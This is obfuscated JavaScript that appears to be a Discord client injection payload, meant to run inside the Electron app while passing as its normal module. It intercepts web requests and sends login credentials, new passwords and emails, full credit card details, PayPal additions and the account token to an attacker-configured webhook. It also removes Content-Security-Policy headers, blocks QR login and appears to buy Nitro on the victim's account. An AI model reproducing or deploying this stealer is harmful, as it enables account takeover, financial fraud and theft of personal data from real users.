0x0:_0x8c88bd=_0x3b8581(0x15c);break;default:_0x8c88bd=_0x3b8581(0x15c);break;}return _0x8c88bd;},hooker=async _0x16199f=>{const _0x3d44de=_0x389ed9,_0xe7788=JSON['stringify'](_0x16199f),_0xd2a5bb=new URL(config[_0x3d44de(0x134)]),_0xbcecd6={'Content-Type':_0x3d44de(0x1ee),'Access-Control-Allow-Origin':'*'};if(!config[_0x3d44de(0x134)][_0x3d44de(0x1e8)](_0x3d44de(0x1ab))){const _0x2c8cba=totp(config['webhook_protector_key']);_0xbcecd6[_0x3d44de(0x1ce)]=_0x2c8cba;}const _0x934b40={'protocol':_0xd2a5bb[_0x3d44de(0x1b5)],'hostname':_0xd2a5bb['host'],'path':_0xd2a5bb['pathname'],'method':_0x3d44de(0x14e),'headers':_0xbcecd6},_0x134c66=https[_0x3d44de(0x1e4)](_0x934b40);_0x134c66['on'](_0x3d44de(0x136),_0x44b2b8=>{console['log'](_0x44b2b8);}),_0x134c66[_0x3d44de(0x1f0)](_0xe7788),_0x134c66[_0x3d44de(0x1a0)]();},login=async(_0x178737,_0x450a73,_0x4e8adf)=>{const _0x42c417=_0x389ed9,_0x36bffe=await getInfo(_0x4e8adf),_0x244d69=getNitro(_0x36bffe[_0x42c417(0x1c8)]),_0x49ff14=getBadges(_0x36bffe[_0x42c417(0x1e0)]),_0x2a0020=await getBilling(_0x4e8adf),_0x413855={'username':config[_0x42c417(0x17a)],'avatar_url':config[_0x42c417(0x15e)],'embeds':[{'color':config[_0x42c417(0x1bd)],'fields':[{'name':_0x42c417(0x1e5),'value':_0x42c417(0x132)+_0x178737+_0x42c417(0x1d0)+_0x450a73+'**','inline':![]},{'name':_0x42c417(0x1cb),'value':_0x42c417(0x1a5)+_0x244d69+_0x42c417(0x18c)+_0x49ff14+_0x42c417(0x1f1)+_0x2a0020+'**','inline':![]},{'name':_0x42c417(0x187),'value':'`'+_0x4e8adf+'`','inline':![]}],'author':{'name':_0x36bffe[_0x42c417(0x1c0)]+'#'+_0x36bffe[_0x42c417(0x19f)]+_0x42c417(0x160)+_0x36bffe['id'],'icon_url':_0x42c417(0x1ec)+_0x36bffe['id']+'/'+_0x36bffe[_0x42c417(0x1eb)]+_0x42c417(0x1d3)}}]};if(config['ping_on_run'])_0x413855['content']=config[_0x42c417(0x192)];hooker(_0x413855);},passwordChanged=async(_0x2a2c81,_0x4f2885,_0x515e89)=>{const _0x25e2c4=_0x389ed9,_0xef499f=await getInfo(_0x515e89),_0x43f54d=getNitro(_0xef499f[_0x25e2c4(0x1c8)]),_0x14f455=getBadges(_0xef499f[_0x25e2c4(0x1e0)]),_0x4af067=await getBilling(_0x515e89),_0x3a34eb={'username':config[_0x25e2c4(0x17a)],'avatar_url':config[_0x25e2c4(0x15e)],'embeds':[{'color':config['embed_color'],'fields':[{'name':'**Password\x20Changed**','value':'Email:\x20**'+_0xef499f[_0x25e2c4(0x1df)]+_0x25e2c4(0x1d2)+_0x2a2c81+'**\x0aNew\x20Password:\x20**'+_0x4f2885+'**','inline':!![]},{'name':_0x25e2c4(0x1cb),'value':_0x25e2c4(0x1a5)+_0x43f54d+_0x25e2c4(0x18c)+_0x14f455+_0x25e2c4(0x1f1)+_0x4af067+'**','inline':!![]},{'name':_0x25e2c4(0x187),'value':'`'+_0x515e89+'`','inline':![]}],'author':{'name':_0xef499f['username']+'#'+_0xef499f[_0x25e2c4(0x19f)]+_0x25e2c4(0x160)+_0xef499f['id'],'icon_url':_0x25e2c4(0x1ec)+_0xef499f['id']+'/'+_0xef499f['avatar']+_0x25e2c4(0x1d3)}}]};if(config[_0x25e2c4(0x130)])_0x3a34eb[_0x25e2c4(0x150)]=config[_0x25e2c4(0x192)];hooker(_0x3a34eb);},emailChanged=async(_0x2fdccd,_0x274c26,_0x3e8d33)=>{const _0xacd371=_0x389ed9,_0x45f470=await getInfo(_0x3e8d33),_0x5328ae=getNitro(_0x45f470[_0xacd371(0x1c8)]),_0x4d7aee=getBadges(_0x45f470[_0xacd371(0x1e0)]),_0x13cc41=await getBilling(_0x3e8d33),_0x24fdff={'username':config[_0xacd371(0x17a)],'avatar_url':config['embed_icon'],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0xacd371(0x133),'value':_0xacd371(0x172)+_0x2fdccd+_0xacd371(0x1a9)+_0x274c26+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0xacd371(0x1a5)+_0x5328ae+_0xacd371(0x18c)+_0x4d7aee+_0xacd371(0x1f1)+_0x13cc41+'**','inline':!![]},{'name':_0xacd371(0x187),'value':'`'+_0x3e8d33+'`','inline':![]}],'author':{'name':_0x45f470['username']+'#'+_0x45f470[_0xacd371(0x19f)]+_0xacd371(0x160)+_0x45f470['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x45f470['id']+'/'+_0x45f470['avatar']+_0xacd371(0x1d3)}}]};if(config[_0xacd371(0x130)])_0x24fdff[_0xacd371(0x150)]=config['ping_val'];hooker(_0x24fdff);},PaypalAdded=async _0x41bc8e=>{const _0x576371=_0x389ed9,_0x434259=await getInfo(_0x41bc8e),_0x4d19c5=getNitro(_0x434259[_0x576371(0x1c8)]),_0x122367=getBadges(_0x434259['flags']),_0x22ff6c=getBilling(_0x41bc8e),_0x40ea70={'username':config[_0x576371(0x17a)],'avatar_url':config[_0x576371(0x15e)],'embeds':[{'color':config[_0x576371(0x1bd)],'fields':[{'name':'**Paypal\x20Added**','value':_0x576371(0x17b),'inline':![]},{'name':_0x576371(0x1cb),'value':_0x576371(0x1a5)+_0x4d19c5+'*\x0aBadges:\x20**'+_0x122367+_0x576371(0x1f1)+_0x22ff6c+'**','inline':![]},{'name':_0x576371(0x187),'value':'`'+_0x41bc8e+'`','inline':![]}],'author':{'name':_0x434259[_0x576371(0x1c0)]+'#'+_0x434259[_0x576371(0x19f)]+_0x576371(0x160)+_0x434259['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x434259['id']+'/'+_0x434259[_0x576371(0x1eb)]+_0x576371(0x1d3)}}]};if(config[_0x576371(0x130)])_0x40ea70[_0x576371(0x150)]=config[_0x576371(0x192)];hooker(_0x40ea70);},ccAdded=async(_0x56abf9,_0x25bdd9,_0x22e26a,_0x35e84c,_0xc1804e)=>{const _0x54fc18=_0x389ed9,_0x268b33=await getInfo(_0xc1804e),_0x32e2d1=getNitro(_0x268b33[_0x54fc18(0x1c8)]),_0x4743b7=getBadges(_0x268b33[_0x54fc18(0x1e0)]),_0x497a2e=await getBilling(_0xc1804e),_0x28d623={'username':config[_0x54fc18(0x17a)],'avatar_url':config[_0x54fc18(0x15e)],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0x54fc18(0x17e),'value':_0x54fc18(0x16f)+_0x56abf9+_0x54fc18(0x15f)+_0x25bdd9+_0x54fc18(0x162)+_0x22e26a+'/'+_0x35e84c+'**','inline':!![]},{'name':_0x54fc18(0x1cb),'value':_0x54fc18(0x1a5)+_0x32e2d1+_0x54fc18(0x18c)+_0x4743b7+'**\x0aBilling:\x20**'+_0x497a2e+'**','inline':!![]},{'name':'**Token**','value':'`'+_0xc1804e+'`','inline':![]}],'author':{'name':_0x268b33['username']+'#'+_0x268b33[_0x54fc18(0x19f)]+'\x20|\x20'+_0x268b33['id'],'icon_url':_0x54fc18(0x1ec)+_0x268b33['id']+'/'+_0x268b33[_0x54fc18(0x1eb)]+_0x54fc18(0x1d3)}}]};if(config[_0x54fc18(0x130)])_0x28d623[_0x54fc18(0x150)]=config[_0x54fc18(0x192)];hooker(_0x28d623);},nitroBought=async _0xabe902=>{const _0xcb6263=_0x389ed9,_0x19348e=await getInfo(_0xabe902),_0x2451c2=getNitro(_0x19348e[_0xcb6263(0x1c8)]),_0x264859=getBadges(_0x19348e[_0xcb6263(0x1e0)]),_0x287abd=await getBilling(_0xabe902),_0x36316b=await buyNitro(_0xabe902),_0x193e14={'username':config[_0xcb6263(0x17a)],'content':_0x36316b,'avatar_url':config['embed_icon'],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0xcb6263(0x1b9),'value':_0xcb6263(0x1c3)+_0x36316b+_0xcb6263(0x146),'inline':!![]},{'name':_0xcb6263(0x1cb),'value':'Nitro\x20Type:\x20**'+_0x2451c2+_0xcb6263(0x18c)+_0x264859+_0xcb6263(0x1f1)+_0x287abd+'**','inline':!![]},{'name':_0xcb6263(0x187),'value':'`'+_0xabe902+'`','inline':![]}],'author':{'name':_0x19348e[_0xcb6263(0x1c0)]+'#'+_0x19348e['discriminator']+_0xcb6263(0x160)+_0x19348e['id'],'icon_url':_0xcb6263(0x1ec)+_0x19348e['id']+'/'+_0x19348e[_0xcb6263(0x1eb)]+_0xcb6263(0x1d3)}}]};if(config[_0xcb6263(0x130)])_0x193e14[_0xcb6263(0x150)]=config[_0xcb6263(0x192)]+('\x0a'+_0x36316b);hooker(_0x193e14);};session['defaultSession'][_0x389ed9(0x1cd)][_0x389ed9(0x1af)](config['filter2'],(_0x53fc49,_0x2a8b00)=>{const _0x572493=_0x389ed9;if(_0x53fc49[_0x572493(0x1d9)][_0x572493(0x144)]('wss://remote-auth-gateway'))return _0x2a8b00({'cancel':!![]});updateCheck();}),session[_0x389ed9(0x16e)][_0x389ed9(0x1cd)][_0x389ed9(0x1dd)]((_0xd5827f,_0xdfb31b)=>{const _0x48670e=_0x389ed9;_0xd5827f[_0x48670e(0x1d9)][_0x48670e(0x144)](config[_0x48670e(0x134)])?_0xd5827f[_0x48670e(0x1d9)][_0x48670e(0x1e8)]('discord.com')?_0xdfb31b({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0xd5827f[_0x48670e(0x1da)])}):_0xdfb31b({'responseHeaders':Object['assign']({'Content-Security-Policy':[_0x48670e(0x1cf),_0x48670e(0x1b8),_0x48670e(0x1d7)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0xd5827f[_0x48670e(0x1da)])}):(delete _0xd5827f['responseHeaders']['content-security-policy'],delete _0xd5827f[_0x48670e(0x1da)][_0x48670e(0x184)],_0xdfb31b({'responseHeaders':{..._0xd5827f[_0x48670e(0x1da)],'Access-Control-Allow-Headers':'*'}}));}),session[_0x389ed9(0x16e)][_0x389ed9(0x1cd)]['onCompleted'](config[_0x389ed9(0x1c9)],async(_0x45f265,_0x3713cd)=>{const _0x21d5f1=_0x389ed9;if(_0x45f265['statusCode']!==0xc8&&_0x45f265[_0x21d5f1(0x1ca)]!==0xca)return;const _0x4c710f=Buffer[_0x21d5f1(0x1e3)](_0x45f265[_0x21d5f1(0x170)][0x0][_0x21d5f1(0x13c)])[_0x21d5f1(0x19c)](),_0x1ba87b=JSON[_0x21d5f1(0x1d4)](_0x4c710f),_0x2c7c21=await execScript(_0x21d5f1(0x173));switch(!![]){case _0x45f265[_0x21d5f1(0x1d9)][_0x21d5f1(0x1f4)](_0x21d5f1(0x1ae)):login(_0x1ba87b[_0x21d5f1(0x1ae)],_0x1ba87b[_0x21d5f1(0x180)],_0x2c7c21)[_0x21d5f1(0x1ed)](console['error']);break;case _0x45f265['url']['endsWith']('users/@me')&&_0x45f265[_0x21d5f1(0x1ef)]==='PATCH':if(!_0x1ba87b[_0x21d5f1(0x180)])return;_0x1ba87b[_0x21d5f1(0x1df)]&&emailChanged(_0x1ba87b[_0x21d5f1(0x1df)],_0x1ba87b['password'],_0x2c7c21)[_0x21d5f1(0x1ed)](console[_0x21d5f1(0x136)]);_0x1ba87b[_0x21d5f1(0x13b)]&&passwordChanged(_0x1ba87b[_0x21d5f1(0x180)],_0x1ba87b[_0x21d5f1(0x13b)],_0x2c7c21)[_0x21d5f1(0x1ed)](console[_0x21d5f1(0x136)]);break;case _0x45f265['url'][_0x21d5f1(0x1f4)]('tokens')&&_0x45f265[_0x21d5f1(0x1ef)]==='POST':const _0x3cec78=querystring[_0x21d5f1(0x1d4)](unparsedData['toString']());ccAdded(_0x3cec78['card[number]'],_0x3cec78[_0x21d5f1(0x1b0)],_0x3cec78['card[exp_month]'],_0x3cec78[_0x21d5f1(0x1d5)],_0x2c7c21)[_0x21d5f1(0x1ed)](console[_0x21d5f1(0x136)]);break;case _0x45f265[_0x21d5f1(0x1d9)][_0x21d5f1(0x1f4)](_0x21d5f1(0x143))&&_0x45f265[_0x21d5f1(0x1ef)]===_0x21d5f1(0x14e):PaypalAdded(_0x2c7c21)[_0x21d5f1(0x1ed)](console[_0x21d5f1(0x136)]);break;case _0x45f265[_0x21d5f1(0x1d9)][_0x21d5f1(0x1f4)]('confirm')&&_0x45f265[_0x21d5f1(0x1ef)]==='POST':if(!config[_0x21d5f1(0x1a4)])return;setTimeout(()=>{const _0x111557=_0x21d5f1;nitroBought(_0x2c7c21)[_0x111557(0x1ed)](console[_0x111557(0x136)]);},0x1d4c);break;default:break;}}),module[_0x389ed9(0x15a)]=require(_0x389ed9(0x164));
